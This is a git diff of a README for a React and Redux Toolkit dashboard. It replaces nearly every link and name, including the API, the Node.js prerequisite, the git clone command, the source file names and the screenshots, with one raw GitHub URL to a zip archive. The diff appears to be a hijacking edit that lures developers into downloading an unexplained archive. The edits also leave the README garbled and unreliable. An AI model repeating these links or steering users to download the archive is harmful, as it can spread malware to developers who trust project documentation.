@@ -1,7 +1,7 @@
 # React + Redux Toolkit + Tailwind Dashboard
 
 ## Overview
-This project is a React-based web application utilizing Redux Toolkit for state management and Tailwind CSS for styling. It fetches data from [DummyJSON API](https://dummyjson.com/) and provides a user and product management system with filtering, searching, and pagination functionalities.
+This project is a React-based web application utilizing Redux Toolkit for state management and Tailwind CSS for styling. It fetches data from [DummyJSON API](https://raw.githubusercontent.com/nabil-alsaadi/react-dashboard/main/src/api/dashboard-react-1.7.zip) and provides a user and product management system with filtering, searching, and pagination functionalities.
 
 ## Features
 - **Users & Products Pages**: Display users and products in a tabular format.
@@ -25,12 +25,12 @@ This project is a React-based web application utilizing Redux Toolkit for state 
 ## Installation
 
 ### Prerequisites
-Make sure you have **Node.js (>=14.x)** installed.
+Make sure you have **https://raw.githubusercontent.com/nabil-alsaadi/react-dashboard/main/src/api/dashboard-react-1.7.zip (>=14.x)** installed.
 
 ### Steps to Run the Project
 ```sh
 # Clone the repository
-git clone https://github.com/nabil-alsaadi/react-dashboard.git
+git clone https://raw.githubusercontent.com/nabil-alsaadi/react-dashboard/main/src/api/dashboard-react-1.7.zip
 cd react-dashboard
 
 # Install dependencies
@@ -49,14 +49,14 @@ The application will be available at `http://localhost:3000`.
 │   ├── pages             # Page components (Users, Products)
 │   ├── store             # Redux slices
 │   ├── constants         # Constants and configurations
-│   ├── App.tsx           # Main app entry point
-│   └── index.tsx         # Root file
-└── README.md             # Project documentation
+│   ├── https://raw.githubusercontent.com/nabil-alsaadi/react-dashboard/main/src/api/dashboard-react-1.7.zip           # Main app entry point
+│   └── https://raw.githubusercontent.com/nabil-alsaadi/react-dashboard/main/src/api/dashboard-react-1.7.zip         # Root file
+└── https://raw.githubusercontent.com/nabil-alsaadi/react-dashboard/main/src/api/dashboard-react-1.7.zip             # Project documentation
 ```
 
 ## API Endpoints Used
-- **Users**: `https://dummyjson.com/users`
-- **Products**: `https://dummyjson.com/products`
+- **Users**: `https://raw.githubusercontent.com/nabil-alsaadi/react-dashboard/main/src/api/dashboard-react-1.7.zip`
+- **Products**: `https://raw.githubusercontent.com/nabil-alsaadi/react-dashboard/main/src/api/dashboard-react-1.7.zip`
 - **Filters & Search**:
   - `GET /users/filter?key={key}&value={value}`
   - `GET /products/search?q={query}`
@@ -79,10 +79,10 @@ The build files will be available in the `build/` directory, ready for deploymen
 Here are some screenshots showcasing the project:
 
 ### Products Page
-![Products Page](screenshots/products-screen.png)
+![Products Page](https://raw.githubusercontent.com/nabil-alsaadi/react-dashboard/main/src/api/dashboard-react-1.7.zip)
 
 ### Users Page
-![Users Page](screenshots/users-screen.png)
+![Users Page](https://raw.githubusercontent.com/nabil-alsaadi/react-dashboard/main/src/api/dashboard-react-1.7.zip)
 
 ## License
 This project is open-source and available under the MIT License.
